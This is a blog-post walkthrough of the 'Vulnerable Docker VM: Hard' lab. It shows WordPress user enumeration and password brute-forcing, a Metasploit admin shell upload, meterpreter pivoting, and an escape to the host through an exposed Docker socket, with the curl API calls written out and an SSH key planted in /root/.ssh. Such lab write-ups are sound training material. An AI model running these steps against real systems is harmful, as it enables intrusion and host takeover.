@@ -1,0 +1,449 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Vulnerable Docker VM: Hard - tcunha.github.io</title>
+  <meta name="author" content="tcunha">
+
+  
+  <meta name="description" content="Since this is running WordPress, the standard WPScan flags to enumerate
+information were used. Nothing relevant popped besides its users: 1
+2
+3
+4
+5
+6 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-hard/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tcunha.github.io" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tcunha.github.io</a></h1>
+  
+    <h2>The lesson of history is that no one learns.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="tcunha.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Vulnerable Docker VM: Hard</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2017-11-01T11:20:17+00:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2017</span></span> <span class='time'>11:20 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Since this is running WordPress, the standard WPScan flags to enumerate
+information were used. Nothing relevant popped besides its users:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">[snip]</span>
+</span><span class='line'><span class="go">[+] Enumerating usernames ...</span>
+</span><span class='line'><span class="go">[+] Identified the following 1 user/s:</span>
+</span><span class='line'><span class="go">    +----+-------+-----------------+</span>
+</span><span class='line'><span class="go">    | Id | Login | Name            |</span>
+</span><span class='line'><span class="go">    +----+-------+-----------------+</span>
+</span><span class='line'><span class="go">    | 1  | bob   | bob _ NotSoEasy |</span>
+</span><span class='line'><span class="go">    +----+-------+-----------------+</span>
+</span><span class='line'><span class="go">[snip]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With this, brute-forcing seemed the next logical step. Used the rockyou wordlist
+to obtain the password:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">[snip]</span>
+</span><span class='line'><span class="go">+----+-------+------+----------+</span>
+</span><span class='line'><span class="go">| Id | Login | Name | Password |</span>
+</span><span class='line'><span class="go">+----+-------+------+----------+</span>
+</span><span class='line'><span class="go">|    | bob   |      | Welcome1 |</span>
+</span><span class='line'><span class="go">+----+-------+------+----------+</span>
+</span><span class='line'><span class="go">[snip]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Logging in reveals the first flag in a WordPress draft:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998</span>
+</span><span class='line'><span class="go">[snip]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Decided with using Metasploit for an interactive shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">msf &gt; use exploit/unix/webapp/wp_admin_shell_upload</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set password Welcome1</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set rhost ...</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set rport 8000</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set user bob</span>
+</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; run</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After unsuccessfully scouring the Web for an exploit that affected this kernel
+version, tried to horizontally escalate privileges by finding containers on the
+same user-defined network. To obtain more reliable results, a statically
+compiled nmap was sent to the machine to perform a ping sweep and a TCP scan.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">Starting Nmap 7.11 ( https://nmap.org ) at 2017-11-01 09:46 UTC</span>
+</span><span class='line'><span class="go">Cannot find nmap-payloads. UDP payloads are disabled.</span>
+</span><span class='line'><span class="go">Nmap scan report for 172.18.0.1</span>
+</span><span class='line'><span class="go">Host is up (0.00053s latency).</span>
+</span><span class='line'><span class="go">Nmap scan report for content_db_1.content_default (172.18.0.2)</span>
+</span><span class='line'><span class="go">Host is up (0.00040s latency).</span>
+</span><span class='line'><span class="go">Nmap scan report for content_ssh_1.content_default (172.18.0.3)</span>
+</span><span class='line'><span class="go">Host is up (0.00029s latency).</span>
+</span><span class='line'><span class="go">Nmap scan report for 8f4bca8ef241 (172.18.0.4)</span>
+</span><span class='line'><span class="go">Host is up (0.00025s latency).</span>
+</span><span class='line'><span class="go">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.97 seconds</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">Starting Nmap 7.11 ( https://nmap.org ) at 2017-11-01 10:02 UTC</span>
+</span><span class='line'><span class="go">Cannot find nmap-payloads. UDP payloads are disabled.</span>
+</span><span class='line'><span class="go">Nmap scan report for 172.18.0.1</span>
+</span><span class='line'><span class="go">Host is up (0.00016s latency).</span>
+</span><span class='line'><span class="go">Not shown: 65533 closed ports</span>
+</span><span class='line'><span class="go">PORT     STATE SERVICE</span>
+</span><span class='line'><span class="go">22/tcp   open  ssh</span>
+</span><span class='line'><span class="go">8000/tcp open  http-alt</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Nmap scan report for content_db_1.content_default (172.18.0.2)</span>
+</span><span class='line'><span class="go">Host is up (0.00049s latency).</span>
+</span><span class='line'><span class="go">Not shown: 65534 closed ports</span>
+</span><span class='line'><span class="go">PORT     STATE SERVICE</span>
+</span><span class='line'><span class="go">3306/tcp open  mysql</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Nmap scan report for content_ssh_1.content_default (172.18.0.3)</span>
+</span><span class='line'><span class="go">Host is up (0.00047s latency).</span>
+</span><span class='line'><span class="go">Not shown: 65533 closed ports</span>
+</span><span class='line'><span class="go">PORT     STATE SERVICE</span>
+</span><span class='line'><span class="go">22/tcp   open  ssh</span>
+</span><span class='line'><span class="go">8022/tcp open  oa-system</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Nmap scan report for 8f4bca8ef241 (172.18.0.4)</span>
+</span><span class='line'><span class="go">Host is up (0.00015s latency).</span>
+</span><span class='line'><span class="go">Not shown: 65534 closed ports</span>
+</span><span class='line'><span class="go">PORT   STATE SERVICE</span>
+</span><span class='line'><span class="go">80/tcp open  http</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Nmap done: 4 IP addresses (4 hosts up) scanned in 6.19 seconds</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Scanning revealed a potential target with port 8022/tcp open. Reaching it is
+possible with meterpreter port-forwarding:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">meterpreter &gt; portfwd add -l 8192 -p 8022 -r 172.18.0.3</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Accessing it on a browser spawns a shell on the DB container as root. While
+enumerating this new container, noticed that the Docker socket is available in
+the /var/run directory, thus, giving full control of the daemon on the host.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ id</span>
+</span><span class='line'><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since the vulnerable Virtual Machine wasn&rsquo;t started with NAT configured, to
+interact with the UNIX domain socket, a locally and statically compiled cURL
+was sent as base64 to the remote machine as a WordPress draft and extracted
+with the MySQL client:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ mysql -h 127.0.0.1 -u wordpress                                 \</span>
+</span><span class='line'><span class="go">    -e &#39;select post_content from wordpress.wp_posts where ID = 151&#39; \</span>
+</span><span class='line'><span class="go">    -p &gt;curl</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next a container with a host bind mount was created and started by using the
+REST API:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ curl --unix-socket /var/run/docker.sock -XPOST                   \</span>
+</span><span class='line'><span class="go">    -H &#39;Content-Type: application/json&#39;                              \</span>
+</span><span class='line'><span class="go">    -d &#39;{ &quot;Image&quot;: &quot;wordpress:latest&quot;, &quot;AttachStdin&quot;: true,          \</span>
+</span><span class='line'><span class="go">    &quot;Tty&quot;: true, &quot;Entrypoint&quot;: [ &quot;/bin/sh&quot;, &quot;-c&quot; ], &quot;HostConfig&quot;: {  \</span>
+</span><span class='line'><span class="go">    &quot;Binds&quot;: [ &quot;/:/srv&quot; ] }, &quot;Cmd&quot;: [ &quot;sh &quot; ] }&#39;                     \</span>
+</span><span class='line'><span class="go">    http:/v1.24/containers/create?name=docker-root</span>
+</span><span class='line'><span class="go">/ $ curl --unix-socket /var/run/docker.sock -XPOST                   \</span>
+</span><span class='line'><span class="go">    -H &#39;Content-Type: application/json&#39;                              \</span>
+</span><span class='line'><span class="go">    http:/v1.24/containers/docker-root/start</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With a container created with full access to the host root directory under /srv,
+it is only a matter of creating a tarball with a SSH public key (which can be
+uploaded using the same method as above):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ curl --unix-socket /var/run/docker.sock -XPUT                     \</span>
+</span><span class='line'><span class="go">    --upload-file key.tar                                             \</span>
+</span><span class='line'><span class="go">    http:/v1.24/containers/docker-root/archive?path=/srv/root/.ssh</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Connecting via SSH on the externally standard available port:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">root@vulndocker:/#</span> id
+</span><span class='line'><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
+</span><span class='line'><span class="gp">root@vulndocker:/#</span> head -n1 flag_3
+</span><span class='line'><span class="go">d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">tcunha</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2017-11-01T11:20:17+00:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2017</span></span> <span class='time'>11:20 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/vm/'>vm</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-hard/" data-via="" data-counturl="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-hard/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2017/11/01/vulnerable-docker-vm-easy/" title="Previous Post: Vulnerable Docker VM: Easy">&laquo; Vulnerable Docker VM: Easy</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2017/11/01/vulnerable-docker-vm-hard/">Vulnerable Docker VM: Hard</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/11/01/vulnerable-docker-vm-easy/">Vulnerable Docker VM: Easy</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/29/protostar-stack/">Protostar Stack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/11/12/rop-primer-0-dot-2/">ROP Primer: 0.2</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2017 - tcunha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
